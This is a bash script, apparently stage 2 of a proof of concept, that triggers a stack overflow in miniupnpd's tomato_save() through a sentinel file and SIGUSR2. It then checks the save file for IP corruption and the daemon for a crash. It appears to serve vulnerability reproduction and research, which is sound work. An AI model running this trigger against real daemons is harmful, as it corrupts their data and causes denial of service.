#!/bin/bash
# trigger_save.sh
# Stage 2: triggers tomato_save() in the running miniupnpd daemon.
#
# How it works:
#   1. Creates /etc/upnp/save — the sentinel file tomato_helper() checks
#   2. Sends SIGUSR2 to miniupnpd — which calls tomato_helper()
#   3. tomato_helper() sees /etc/upnp/save, calls tomato_save("/etc/upnp/data")
#   4. tomato_save() enumerates all mappings, hitting the UDPLITE overflow
#   5. The corrupted data is written to /etc/upnp/data
#
# On unprotected build: daemon survives, /etc/upnp/data has a corrupted IP
# On protected build:   daemon aborts with "stack smashing detected"

set -e

DAEMON_PID=$(pgrep miniupnpd 2>/dev/null | head -1)

if [ -z "$DAEMON_PID" ]; then
    echo "[-] miniupnpd is not running. Start it with: sudo ./run_daemon.sh"
    exit 1
fi

echo "[*] Found miniupnpd PID: $DAEMON_PID"

# Clean up any previous output
sudo rm -f /etc/upnp/data
sudo mkdir -p /etc/upnp

echo "[*] Creating /etc/upnp/save sentinel file..."
sudo touch /etc/upnp/save

echo "[*] Sending SIGUSR2 to PID $DAEMON_PID to trigger tomato_helper()..."
sudo kill -USR2 "$DAEMON_PID"

# Give the daemon a moment to process the signal
sleep 1

echo ""
echo "=== Results ==="

if [ -f /etc/upnp/data ]; then
    echo "[+] /etc/upnp/data was written by tomato_save()"
    echo ""
    echo "--- File contents ---"
    cat /etc/upnp/data
    echo ""
    echo "--- Hex dump ---"
    xxd /etc/upnp/data
    echo ""

    # Check for corruption
    if grep -q "ITE" /etc/upnp/data; then
        echo "[!!!] CORRUPTION CONFIRMED: 'ITE' found in save file instead of IP address"
        echo "      The overflow wrote 'ITE\\0' over the first 4 bytes of iaddr."
    elif ! grep -qE '^UDPLITE' /etc/upnp/data; then
        echo "[?] UDPLITE mapping not found in output — may have been filtered or daemon crashed"
    else
        echo "[+] UDPLITE mapping present, check IP field above for corruption"
    fi
else
    echo "[-] /etc/upnp/data was NOT written."
    echo "    Possible causes:"
    echo "      - Daemon crashed (stack-protected build hit the canary)"
    echo "      - UDPLITE mapping was not stored (check daemon output)"
    echo "      - /etc/upnp/save was already removed before signal was handled"
    echo ""
    echo "    Check daemon terminal for 'stack smashing detected' message."
fi

echo ""
echo "[*] Is miniupnpd still running?"
if pgrep miniupnpd > /dev/null 2>&1; then
    echo "[+] Yes — daemon survived (unprotected build, silent corruption)"
else
    echo "[-] No  — daemon crashed (stack-protected build, DoS confirmed)"
fi
